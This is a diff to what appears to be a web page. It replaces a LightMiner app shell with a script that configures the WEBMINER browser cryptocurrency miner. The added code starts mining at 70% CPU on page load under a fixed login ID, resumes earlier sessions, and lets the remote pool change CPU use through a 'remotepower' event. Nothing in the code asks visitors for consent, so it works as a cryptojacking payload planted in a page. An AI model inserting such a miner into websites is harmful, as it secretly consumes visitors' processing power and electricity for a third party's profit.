@@ -1,1 +1,40 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"><link rel="icon" href="https://lightminer.co/favicon.ico"><title>LightMiner</title><link href="https://lightminer.co/css/app.5afa92b3.css" rel="stylesheet" crossorigin="anonymous" integrity="sha384-JSMYJLo4l7J76sUDecgy5mQ3Crf+zkXJqVbG/rQDEuidBJrm6wsXstUMMhUG40Dw"></head><body><noscript>Enable JavaScript!</noscript><div id="app"></div><script src="https://lightminer.co/js/chunk-vendors.216fb900.js" crossorigin="anonymous" integrity="sha384-0+668sI+FO8ocJmYphKNE7z4KdgmPO59f6ycpe45wzNOVgJ94xvLTNO+a560Qk2B"></script><script src="https://lightminer.co/js/app.0398743f.js" crossorigin="anonymous" integrity="sha384-OlJ4SNgtNq9UaajaM0Lmcd6PQU0h2LjxYFlJnakl+ZJOTN4qMll60nLEselH8o5N"></script></body></html>
+<script>
+// - Configure:
+WEBMINER.config({ 
+	login: "7205295", // Your ID - required
+	pass: null, // Name for stats, leave blank for automatic set.
+});
+
+// - Universal function for Start/Stop/Change speed - 0 = stop, 1-100 = set percent of CPU usage and start mining if not started:
+WEBMINER.power(70);
+
+// - Restore previous session accepted hashes and power (start mining if it worked in previous session):
+WEBMINER.loadStored();
+
+// - Get current power:
+console.log( WEBMINER.getPower() );
+
+// - Get current speed in hashes/sec:
+console.log( WEBMINER.getHashesPerSecond() );
+
+// - Get current job algo:
+console.log( WEBMINER.getJobAlgo() );
+
+// - Get current job diff:
+console.log( WEBMINER.getJobDiff() );
+
+// - Get accepted by pool hashes (in all sessions)
+console.log( WEBMINER.getAcceptedHashes() );
+
+// - Reset config and stop minig
+WEBMINER.reset(); // Reset config, stop mining and disconnect from pool (you can use it when user logout).
+
+// - Remote change speed event:
+WEBMINER.on('remotepower', (power) => {
+	WEBMINER.power(power); // Is automatic applied if no listeners for this event.
+	console.log('New power:', power);
+});
+
+// - Share accepted event
+WEBMINER.on('accepted', () => console.log('New share') );
+</script>
